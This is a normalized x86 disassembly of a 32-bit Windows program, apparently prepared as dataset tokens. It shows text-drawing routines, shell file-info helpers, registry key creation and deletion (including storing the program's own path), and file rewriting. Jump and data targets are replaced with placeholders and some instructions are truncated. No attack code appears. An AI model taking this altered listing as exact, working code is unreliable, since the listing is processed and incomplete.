cmp [ esp + 0x34 ] esi
je r-xdata
mov al [ ebx + ecx ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
jmp r-xdata
add ebx 0x2
jmp r-xdata
cmp [ ebx + ecx + 0x1 ] 0x74
je r-xdata
sub esi ecx
mov [ esp + 0x20 ] esi
jg r-xdata
mov esi [ esp + 0x20 ]
add esi 0x2
lea edi [ esi + ecx ]
mov [ esp + 0x20 ] esi
mov esi [ ebp + 0x28 ]
cmp edi esi
jle r-xdata
sub edi 0x20000010
je r-xdata
cmp edi 0x2000000c
je r-xdata
test esi esi
mov [ esp + 0x60 ] esi
mov [ esp + 0x14 ] ecx
jle r-xdata
inc esi
cmp ecx edi
jne r-xdata
add ecx 0x2
test esi esi
jne r-xdata
fadd [ esp + 0xb0 ]
test esi esi
mov [ esp + 0x60 ] esi
mov [ esp + 0x6c ] ebx
jle r-xdata
inc esi
cmp ebx edi
jne r-xdata
add ebx 0x2
mov esi eax
and esi 0xfffffff8
and eax 0x7
lea ebx [ eax + edx + 0x7 ]
mov eax [ esp + 0x20 ]
mov [ esp + 0x2c ] esi
mov esi ecx
and ecx 0x1
lea ecx [ ecx + eax + 0x1 ]
and ecx 0xfffffffe
mov [ esp + 0x48 ] ecx
mov ecx [ esp + 0x14 ]
movzx eax [ ecx + 0xe ]
imul eax [ esp + 0x54 ]
cdq
and esi 0xfffffffe
and edx 0x7
add eax edx
mov edx [ esp + 0x30 ]
mov [ esp + 0x44 ] esi
mov esi eax
mov eax [ esp + 0x28 ]
and ebx 0xfffffff8
sar esi 0x3
lea edi [ ebx + 0xf ]
and edi 0xfffffff0
add esi 0x3
and esi 0xfffffffc
mov [ esp + 0x64 ] edi
mov [ esp + 0x68 ] esi
mov [ esp + 0x6c ] edx
mov [ esp + 0x30 ] eax
jmp r-xdata
sub esi ecx
mov [ esp + 0x20 ] esi
mov esi eax
and eax 0x1
lea ebx [ eax + edx + 0x1 ]
and esi 0xfffffffe
and ebx 0xfffffffe
lea edi [ ebx + ebx + 0xf ]
sub edi 0x8
je r-xdata
sub edi 0x10000018
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
jle r-xdata
fild [ esp + 0xd8 ]
fild [ esp + 0xdc ]
jmp r-xdata
mov eax [ esp + 0x20 ]
test eax eax
jle r-xdata
mov eax [ esp + 0x48 ]
cdq
sub eax edx
sar eax 0x1
mov ecx edi
imul ecx eax
add ecx 0x5
mov [ esp + 0x1c ] eax
lea eax [ ecx + ecx * 2 ]
push eax
call j_sub_4b573e#2
add esp 0x4
test eax eax
mov [ esp + 0x28 ] eax
je r-xdata
mov edx [ esp + 0x14 ]
movzx ecx [ edx + 0xe ]
add eax 0xf
and eax 0xfffffff0
mov [ esp + 0x24 ] eax
xor eax eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x58 ] eax
mov eax edi
shr ecx 0x3
cdq
idiv ecx
mov ecx [ esp + 0x14 ]
mov [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
test eax eax
jge r-xdata
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x34 ]
cmp eax 0x20000018
mov [ esp + 0x44 ] ecx
mov ecx [ esp + 0x20 ]
mov ebx edx
mov [ esp + 0x48 ] ecx
je r-xdata
sub edi 0x20000008
jne r-xdata
sub edi 0x8
je r-xdata
mov edx [ esp + 0x64 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call [ SelectObject@IAT ]
mov ecx esi
imul ecx [ esp + 0x20 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x2c ] eax
fild [ esp + 0x1c ]
fld [ esp + 0x78 ]
fcomp st1
fld [ esp + 0x78 ]
fsub st1
fnstsw ax
test ah 0x5
jpe r-xdata
fmul [ esp + 0x70 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
add eax ebx
cmp eax ecx
fadd st1
mov [ esp + 0x10 ] eax
fstp [ esp + 0x78 ]
fstp st0
jl r-xdata
mov eax [ esp + 0x58 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call [ SelectObject@IAT ]
mov edx esi
imul edx [ esp + 0x20 ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x14 ] eax
fild [ esp + 0x24 ]
fld [ esp + 0x78 ]
fcomp st1
fld [ esp + 0x78 ]
fsub st1
fnstsw ax
test ah 0x5
jpe r-xdata
add eax 0xf
and eax 0xfffffff0
mov ecx edi
imul ecx [ esp + 0x48 ]
add ecx eax
mov [ esp + 0x24 ] eax
mov eax edi
cdq
sub eax edx
sar eax 0x1
add eax ecx
mov [ esp + 0x60 ] ecx
mov ecx [ esp + 0x14 ]
movzx ecx [ ecx + 0xe ]
mov [ esp + 0x58 ] eax
mov eax edi
shr ecx 0x3
cdq
idiv ecx
mov ecx [ esp + 0x14 ]
mov [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
test eax eax
jge r-xdata
mov edx [ esp + 0x20 ]
mov [ ecx + 0x8 ] edx
mov eax [ esp + 0x20 ]
neg eax
mov [ ecx + 0x8 ] eax
jmp r-xdata
lea edx [ edx + edx * 2 + 0x3 ]
cmp eax 0x10000018
je r-xdata
sub edi 0xfffffe8
jne r-xdata
lea edx [ esi + 0x1 ]
mov [ esp + 0x1c ] edx
fild [ esp + 0x1c ]
mov [ esp + 0xd0 ] 0x0
mov [ esp + 0xd4 ] 0x0
fdivp st1
fstp [ esp + 0xe0 ]
fmul [ r--data ]
mov [ esp + 0xe0 ] 0x0
mov [ esp + 0xe4 ] 0x0
fstp [ esp + 0xd0 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
mov [ esp + 0x24 ] eax
fild [ esp + 0x24 ]
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x94 ] 0x0
fdivp st1
fstp [ esp + 0x98 ]
fmul [ r--data ]
mov [ esp + 0x98 ] 0x0
mov [ esp + 0x9c ] 0x0
fstp [ esp + 0x90 ]
jmp r-xdata
mov eax [ esp + 0x1c ]
lea eax [ eax + eax * 2 ]
mov [ ecx + 0x8 ] eax
mov ecx [ esp + 0x14 ]
jmp r-xdata
mov eax [ esp + 0x48 ]
cdq
sub eax edx
sar eax 0x1
neg eax
lea edx [ eax + eax * 2 ]
mov [ ecx + 0x8 ] edx
jmp r-xdata
mov eax [ esp + 0x44 ]
mov eax [ ebp + 0x28 ]
mov edx [ esp + 0x48 ]
mov ecx [ esp + 0x44 ]
sub eax edx
sub eax ecx
jmp r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
jle r-xdata
mov ecx edi
imul ecx [ esp + 0x20 ]
add ecx 0xf
push ecx
call j_sub_4b573e#2
add esp 0x4
test eax eax
mov [ esp + 0x28 ] eax
je r-xdata
shl edx 0x2
jmp r-xdata
mov esi eax
and eax 0x3
lea ebx [ eax + edx + 0x3 ]
and esi 0xfffffffc
and ebx 0xfffffffc
lea edi [ ebx + 0xf ]
jmp r-xdata
mov edx [ esp + 0x2c ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call [ SelectObject@IAT ]
jmp r-xdata
fld [ esp + 0x38 ]
mov [ esp + 0x24 ] eax
fsub [ esp + 0x78 ]
fstp [ esp + 0xf0 ]
lea ebx [ ebx ]
xor eax eax
fstp st0
test esi esi
jle r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call [ SelectObject@IAT ]
jmp r-xdata
fld [ esp + 0x38 ]
mov ebx [ esp + 0x20 ]
fsub [ esp + 0x78 ]
mov [ esp + 0x24 ] eax
fstp [ esp + 0xa8 ]
xor eax eax
fstp st0
test esi esi
jle r-xdata
mov ecx [ esp + 0x2c ]
mov eax [ ebp + 0x24 ]
lea edx [ ebx + ecx ]
cmp edx eax
jle r-xdata
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
mov al [ rw-data ]
test al al
mov [ edi + 0x8 ] ecx
jne r-xdata
mov ecx [ ebp + 0x2c ]
mov edx [ esp + 0x84 ]
push 0x0
push ecx
mov ecx [ esp + 0x70 ]
push edx
mov edx [ esp + 0x68 ]
push ecx
mov ecx [ esp + 0x5c ]
push esi
push edx
mov edx [ esp + 0x48 ]
push ecx
mov ecx [ esp + 0x88 ]
push edx
mov edx [ esp + 0x70 ]
push ecx
mov ecx [ ebp + 0x28 ]
push edx
mov edx [ ebp + 0x24 ]
push ecx
mov ecx [ esp + 0x90 ]
push edx
mov edx [ esp + 0x78 ]
push eax
mov eax [ esp + 0x60 ]
push eax
mov eax [ esp + 0x90 ]
push ecx
mov ecx [ esp + 0x9c ]
push edi
push edx
mov edx [ esp + 0x68 ]
push ebx
push 0x0
push 0x0
push eax
push ecx
push edx
call [ rw-data ]
test eax eax
mov edi [ esp + 0x14 ]
je r-xdata
lea edi [ edx + 0xf ]
mov edx [ esp + 0x14 ]
movzx eax [ edx + 0xe ]
imul eax [ esp + 0x54 ]
cdq
and edx 0x7
add eax edx
mov esi eax
mov eax [ esp + 0x34 ]
sar esi 0x3
xor ecx ecx
add esi 0x3
and edi 0xfffffff0
and esi 0xfffffffc
cmp eax 0x2000000c
mov [ esp + 0x64 ] ecx
mov [ esp + 0x68 ] ecx
mov [ esp + 0x6c ] ecx
mov [ esp + 0x30 ] ecx
jne r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
mov [ esp + 0x48 ] eax
movzx eax [ edx + 0xe ]
imul eax [ esp + 0x54 ]
cdq
and edx 0x7
mov [ esp + 0x2c ] esi
add eax edx
mov esi eax
sar esi 0x3
mov [ esp + 0x44 ] ecx
xor ecx ecx
add esi 0x3
and edi 0xfffffff0
mov [ esp + 0x64 ] ecx
and esi 0xfffffffc
mov [ esp + 0x68 ] ecx
mov [ esp + 0x6c ] ecx
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
mov edi [ esp + 0x10 ]
add edx ecx
mov ecx [ esp + 0x60 ]
add edi esi
mov eax ebx
cmp eax ecx
mov [ esp + 0x10 ] edi
mov [ esp + 0x24 ] edx
jl r-xdata
cmp [ esp + 0xc4 ] eax
jle r-xdata
mov edi [ esp + 0x10 ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x64 ]
mov ecx [ esp + 0x60 ]
add edi esi
add edx ebx
cmp eax ecx
mov [ esp + 0x10 ] edi
mov [ esp + 0x24 ] edx
jl r-xdata
cmp [ esp + 0xc0 ] eax
jle r-xdata
mov ecx [ esp + 0x48 ]
mov esi [ esp + 0x44 ]
mov eax [ ebp + 0x28 ]
lea edx [ ecx + esi ]
cmp edx eax
jle r-xdata
sub eax ecx
mov ebx eax
push 0x0
push r--data
push r--data
push 0x0
call [ MessageBoxA@IAT ]
mov [ rw-data ] 0x1
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x44 ]
lea ebx [ eax + 0x1 ]
mov [ esp + 0x1c ] ebx
fild [ esp + 0x1c ]
lea edi [ ecx + edx ]
mov cl [ edi ]
xor cl 0x20
fmul [ esp + 0xe0 ]
add cl 0x5f
mov dl 0x3b
cmp dl cl
fiadd [ esp + 0x24 ]
sbb esi esi
sub esp 0x8
add esi 0x2
fadd [ esp + 0xd8 ]
fadd [ esp + 0xf8 ]
fstp [ esp ]
call sub_452510
mov edx [ esp + 0x74 ]
mov ecx [ esp + 0x28 ]
add eax edx
lea edx [ eax + ecx ]
mov ecx [ esp + 0xc4 ]
add esp 0x8
cmp ecx edx
jge r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ ebp + 0x8 ]
push 0x0
push esi
push edi
push 0x0
push 0x0
push eax
mov eax [ esp + 0x70 ]
add eax ecx
push eax
push edx
call [ ExtTextOutA@IAT ]
inc eax
mov [ esp + 0x64 ] eax
fild [ esp + 0x64 ]
sub esp 0x8
fmul [ esp + 0xa0 ]
fiadd [ esp + 0x2c ]
fadd [ esp + 0xb0 ]
fadd [ esp + 0x98 ]
fstp [ esp ]
call sub_452510
mov edi [ esp + 0x70 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x4c ]
add eax edi
lea edi [ ecx + edx ]
mov cl [ edi ]
xor cl 0x20
add cl 0x5f
mov dl 0x3b
add esp 0x8
cmp dl cl
mov edx [ esp + 0xb8 ]
sbb esi esi
lea ecx [ eax + ebx ]
add esi 0x2
cmp edx ecx
jge r-xdata
mov ebx [ esp + 0x6c ]
mov edx [ esp + 0x2c ]
push 0x0
push esi
push edi
push 0x0
push 0x0
sub edx ebx
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ ExtTextOutA@IAT ]
mov eax ecx
sub eax esi
jmp r-xdata
push 0x0
push eax
mov eax [ esp + 0x64 ]
push ebx
push 0x0
push 0x0
push eax
mov eax [ esp + 0x50 ]
push ecx
push edx
push edi
push eax
lea ecx [ esp + 0x5b4 ]
call sub_43ba10
test eax eax
je r-xdata
push eax
mov eax [ esp + 0x60 ]
push ebx
push 0x0
push 0x0
push eax
mov eax [ esp + 0x4c ]
push ecx
push edx
push edi
push eax
lea ecx [ esp + 0x5b0 ]
call sub_43ce20
test eax eax
jne r-xdata
mov cl [ ebp + 0x40 ]
mov edx [ esp + 0x24 ]
test cl cl
mov ecx [ esp + 0x60 ]
push 0x0
je r-xdata
mov al [ ebp + 0x3c ]
test al al
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x10 ]
push eax
mov [ edi + 0x4 ] ecx
mov [ edi + 0x8 ] edx
call j_sub_4b66ed
add esp 0x4
mov eax [ ebp + 0x20 ]
mov edx [ esp + 0x2c ]
mov ecx [ ebp + 0x18 ]
sub eax esi
push eax
mov eax [ ebp + 0x1c ]
sub eax edx
mov edx [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push eax
push ecx
push edx
jmp r-xdata
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
sub eax esi
mov esi [ esp + 0x2c ]
push eax
mov eax [ ebp + 0x1c ]
sub eax esi
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
cmp [ esp + 0x9c8 ] 0x40000020
jne r-xdata
lea ecx [ esp + 0x5a4 ]
call sub_43af50
mov eax [ ebp + 0x20 ]
mov edx [ esp + 0x2c ]
mov ecx [ ebp + 0x18 ]
sub eax esi
push eax
mov eax [ ebp + 0x1c ]
sub eax edx
mov edx [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push eax
push ecx
push edx
lea ecx [ esp + 0x5a4 ]
call sub_4394a0
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x54 ]
mov esi eax
mov eax [ esp + 0x10 ]
push ecx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] eax
call j_sub_4b66ed
add esp 0x4
sub_4440b0
mov al [ esp + 0x4 ]
test al al
push esi
mov esi ecx
je r-xdata
mov eax [ esi + 0x10 ]
pop esi
retn 0x8
mov al [ esi + 0x888 ]
test al al
je r-xdata
mov eax [ esi + 0x884 ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn 0x8
mov eax [ esi + 0x450 ]
pop esi
retn 0x8
mov eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_441790
test eax eax
je r-xdata
sub_444100
mov al [ esp + 0x4 ]
test al al
push esi
mov esi ecx
je r-xdata
mov eax [ esi + 0x14 ]
pop esi
retn 0x8
mov al [ esi + 0x888 ]
test al al
je r-xdata
mov eax [ esi + 0x884 ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn 0x8
mov eax [ esi + 0x454 ]
pop esi
retn 0x8
mov eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_441790
test eax eax
je r-xdata
sub_444170
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov ax [ esi ]
xor ebx ebx
test ax ax
je r-xdata
push esi
movzx edx ax
call sub_444150
add esp 0x4
test eax eax
je r-xdata
mov eax [ edi ]
lea ecx [ ebx + 0x2 ]
push ecx
push edi
call [ eax + 0xc ]
test eax eax
je r-xdata
lea ecx [ ecx ]
mov ecx ebx
mov edx ecx
shr ecx 0x2
mov edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
mov [ eax + ebx ] 0x0
pop ebx
retn
add ebx edx
movzx edx [ eax ]
push eax
call sub_444150
add esp 0x4
test eax eax
jne r-xdata
sub_4441f0
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
retn
mov edx 0x2
jmp r-xdata
movzx ecx [ eax ]
push eax
add edx ecx
call sub_444150
add esp 0x4
test eax eax
jne r-xdata
mov eax edx
retn
sub_444220
push ecx
push edi
mov edi eax
lea eax [ esp + 0x4 ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jge r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push esi
push edi
push eax
call [ ecx + 0xc ]
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edi
pop ecx
retn
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov ecx edi
mov edx ecx
shr ecx 0x2
xor eax eax
mov edi esi
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax esi
pop esi
pop edi
pop ecx
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_444280
mov eax [ esp + 0x4 ]
test eax eax
push ebx
push ebp
push esi
push edi
je r-xdata
xor edi edi
call sub_4441f0
mov edi eax
sub edi 0x2
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ebp [ esp + 0x18 ]
mov eax ebp
call sub_4441f0
mov ebx eax
lea eax [ ebx + edi ]
call sub_444220
mov esi eax
test esi esi
je r-xdata
push ebx
lea eax [ esi + edi ]
push ebp
push eax
call sub_4b5890
add esp 0xc
push edi
push eax
push esi
call sub_4b5890
add esp 0xc
sub_4442e0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push ebx
mov ebx [ esp + 0xc ]
movzx edx [ ebx ]
push esi
push edi
add edx 0x2
push edx
push eax
call [ ecx + 0xc ]
movzx ecx [ ebx ]
mov edx ecx
shr ecx 0x2
mov esi ebx
mov edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
movzx ecx [ ebx ]
pop edi
pop esi
mov [ ecx + eax ] 0x0
pop ebx
retn
sub_444320
push esi
mov esi [ esp + 0xc ]
push edi
mov eax esi
call sub_4441f0
lea edi [ eax + 0x2 ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0xc ]
mov ecx edi
mov edx ecx
shr ecx 0x2
mov edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_444350
sub esp 0x164
lea eax [ esp ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x16c ]
mov edx [ esp + 0x168 ]
push esi
push ecx
push edx
call sub_444280
add esp 0x8
mov esi eax
mov eax [ esp + 0x174 ]
push eax
push 0x160
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push esi
call [ SHGetFileInfoA@IAT ]
mov eax [ esp + 0x4 ]
mov edx [ eax ]
push esi
push eax
call [ edx + 0x14 ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
pop esi
add esp 0x164
retn
or eax 0xffffffff
add esp 0x164
retn
sub_4443d0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
sub esp 0x108
push esi
push edi
mov edi [ esp + 0x118 ]
lea edx [ esp + 0x8 ]
push edx
mov edx [ esp + 0x120 ]
push edx
push edi
push eax
mov esi 0x1
call [ ecx + 0x2c ]
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x108
retn
mov eax [ esp + 0x8 ]
sub eax 0x0
je r-xdata
mov ecx [ esp + 0x120 ]
mov edx [ esp + 0xc ]
push 0x0
push 0x0
push 0x104
push ecx
push 0xffffffff
push edx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
pop edi
mov eax esi
pop esi
add esp 0x108
retn
dec eax
je r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0x120 ]
add edx edi
push edx
push eax
call [ lstrcpyA@IAT ]
pop edi
mov eax esi
pop esi
add esp 0x108
retn
dec eax
jne r-xdata
mov ecx [ esp + 0x120 ]
lea eax [ esp + 0xc ]
push eax
push ecx
call [ lstrcpyA@IAT ]
pop edi
mov eax esi
pop esi
add esp 0x108
retn
sub_444490
sub esp 0x164
lea eax [ esp ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x16c ]
mov edx [ esp + 0x168 ]
push esi
push ecx
push edx
call sub_444280
add esp 0x8
push 0x408
mov esi eax
push 0x160
lea eax [ esp + 0x10 ]
push eax
push 0x0
push esi
call [ SHGetFileInfoA@IAT ]
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push esi
push eax
call [ ecx + 0x14 ]
mov eax [ esp + 0x4 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov ecx [ esp + 0x174 ]
lea eax [ esp + 0x118 ]
push eax
push ecx
call [ lstrcpyA@IAT ]
mov eax 0x1
pop esi
add esp 0x164
retn
xor eax eax
add esp 0x164
retn
sub_444520
sub esp 0x8
push esi
mov esi [ RegOpenKeyExA@IAT ]
lea eax [ esp + 0x4 ]
push eax
push 0xf003f
push 0x0
push r--data
push 0x80000001
call esi
test eax eax
jne r-xdata
xor eax eax
pop esi
add esp 0x8
retn
mov edx [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
push ecx
push 0xf003f
push eax
push r--data
push edx
call esi
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
mov esi [ RegCloseKey@IAT ]
push ecx
call esi
mov edx [ esp + 0x4 ]
push edx
call esi
mov eax 0x1
pop esi
add esp 0x8
retn
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
sub_4445a0
sub esp 0x454
push esi
mov esi [ RegCreateKeyExA@IAT ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push r--data
push 0x80000001
call esi
test eax eax
jne r-xdata
xor eax eax
pop esi
add esp 0x454
retn
mov ecx [ esp + 0x8 ]
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x8 ]
push eax
push 0x0
push 0xf003f
push 0x0
push r--data
push 0x0
push r--data
push ecx
call esi
test eax eax
je r-xdata
push 0x104
lea eax [ esp + 0x128 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x124 ]
push ecx
call sub_457f40
add esp 0x4
inc eax
push eax
lea edx [ esp + 0x128 ]
push edx
lea eax [ esp + 0x28 ]
push eax
call [ lstrcpynA@IAT ]
push r--data
lea ecx [ esp + 0x24 ]
push ecx
call [ lstrcatA@IAT ]
lea edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0x22c ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ esp + 0x228 ]
push ecx
call [ lstrlenA@IAT ]
mov esi [ RegSetValueExA@IAT ]
inc eax
push eax
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x22c ]
push edx
push 0x1
push 0x0
push 0x0
push eax
call esi
test eax eax
mov ecx [ esp + 0x4 ]
je r-xdata
mov edx [ esp + 0x8 ]
push edx
call [ RegCloseKey@IAT ]
xor eax eax
pop esi
add esp 0x454
retn
push 0x4
lea eax [ esp + 0x20 ]
push eax
push 0x4
push 0x0
push r--data
push ecx
mov [ esp + 0x34 ] 0x32
call esi
test eax eax
mov esi [ RegCloseKey@IAT ]
je r-xdata
mov esi [ RegCloseKey@IAT ]
push ecx
call esi
mov edx [ esp + 0x8 ]
push edx
call esi
xor eax eax
pop esi
add esp 0x454
retn
mov ecx [ esp + 0x4 ]
push ebx
push ecx
call esi
mov edx [ esp + 0xc ]
push edx
call esi
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0xc0000000
lea eax [ esp + 0x3c ]
push eax
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov edx [ esp + 0x4 ]
push edx
call esi
mov eax [ esp + 0x8 ]
push eax
call esi
push edi
push 0x0
push ebx
call [ GetFileSize@IAT ]
mov esi eax
lea ecx [ esi + 0x1 ]
push ecx
mov [ esp + 0x1c ] esi
call j_sub_4b573e#2
mov edi eax
add esp 0x4
test edi edi
je r-xdata
pop ebx
xor eax eax
pop esi
add esp 0x454
retn
push ebx
call [ CloseHandle@IAT ]
pop edi
pop ebx
mov eax 0x1
pop esi
add esp 0x454
retn
push 0x0
lea edx [ esp + 0x24 ]
push edx
push esi
push edi
push ebx
call [ ReadFile@IAT ]
cmp esi [ esp + 0x20 ]
jne r-xdata
push edi
call j_sub_4b66ed
add esp 0x4
mov [ edi + esi ] 0x0
mov al [ edi ]
xor esi esi
test al al
je r-xdata
mov eax edi
cmp [ eax ] 0x0
push ebp
je r-xdata
mov al [ esi + edi ]
lea edx [ esi + edi ]
xor ebp ebp
test al al
je r-xdata
lea esp [ esp ]
add esi ebp
mov cl [ esi + edi ]
test cl cl
lea eax [ esi + edi ]
jne r-xdata
mov ecx edx
inc esi
mov cl [ esi + edi ]
test cl cl
lea eax [ esi + edi ]
jne r-xdata
cmp al 0x9
jne r-xdata
mov al [ eax ]
cmp al 0x20
je r-xdata
jmp r-xdata
inc ebp
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
pop ebp
push r--data
push edx
mov [ esi + edi + 0x11 ] 0x0
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
inc ebp
inc ecx
add ebp 0x2
add ecx 0x2
jmp r-xdata
add ebp esi
cmp esi 0xffffffff
je r-xdata
mov al [ ecx ]
cmp al 0xa
je r-xdata
jmp r-xdata
cmp [ ecx ] 0x0
jne r-xdata
push 0x0
push 0x0
push esi
push ebx
call [ SetFilePointer@IAT ]
lea eax [ esp + 0x130 ]
push eax
lea ecx [ esp + 0x344 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
push 0x0
lea edx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x348 ]
push eax
call [ lstrlenA@IAT ]
mov esi [ WriteFile@IAT ]
push eax
lea ecx [ esp + 0x34c ]
push ecx
push ebx
call esi
mov eax [ esp + 0x1c ]
push 0x0
lea edx [ esp + 0x1c ]
push edx
sub eax ebp
push eax
add ebp edi
push ebp
push ebx
call esi
push ebx
call [ SetEndOfFile@IAT ]
cmp ebp 0x14
jle r-xdata
sub_4448a0
push ecx
lea eax [ esp ]
push eax
push 0xf003f
push 0x0
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop ecx
retn
mov ecx [ esp ]
push r--data
push ecx
call [ RegDeleteKeyA@IAT ]
mov edx [ esp ]
push edx
call [ RegCloseKey@IAT ]
sub_4448f0
sub esp 0x20c
push ebp
mov ebp [ RegCloseKey@IAT ]
push esi
mov esi [ RegOpenKeyExA@IAT ]
push edi
mov edi [ esp + 0x21c ]
cmp edi 0x1
mov [ esp + 0xc ] 0x0
mov [ esp + 0x10 ] 0x100
jl r-xdata
mov edx [ edi * 4 + rw-data ]
lea ecx [ esp + 0xc ]
push ecx
push 0xf003f
push 0x0
push edx
push 0x80000000
call esi
test eax eax
jne r-xdata
mov eax [ edi * 4 + rw-data ]
push eax
lea ecx [ esp + 0x11c ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0xc ]
push edx
push 0xf003f
push 0x0
lea eax [ esp + 0x124 ]
push eax
push 0x80000001
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
cmp edi 0x1
jl r-xdata
mov eax [ esp + 0xc ]
test eax eax
jne r-xdata
push ebx
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
push eax
push eax
mov eax [ esp + 0x20 ]
push r--data
push eax
call [ RegQueryValueExA@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
mov ebx eax
call ebp
test ebx ebx
mov [ esp + 0x10 ] 0x0
pop ebx
jne r-xdata
pop edi
pop esi
pop ebp
add esp 0x20c
retn
cmp edi 0x1
jl r-xdata
mov edx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
push 0x0
push 0x0
push edx
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
lea edx [ esp + 0xc ]
push edx
push 0xf003f
push 0x0
lea eax [ esp + 0x24 ]
push eax
push 0x80000000
call esi
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push 0xf003f
push 0x0
push r--data
push eax
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
push eax
call ebp
lea ecx [ esp + 0xc ]
push ecx
push 0xf003f
push 0x0
lea edx [ esp + 0x24 ]
push edx
push 0x80000000
mov [ esp + 0x20 ] 0x0
call esi
test eax eax
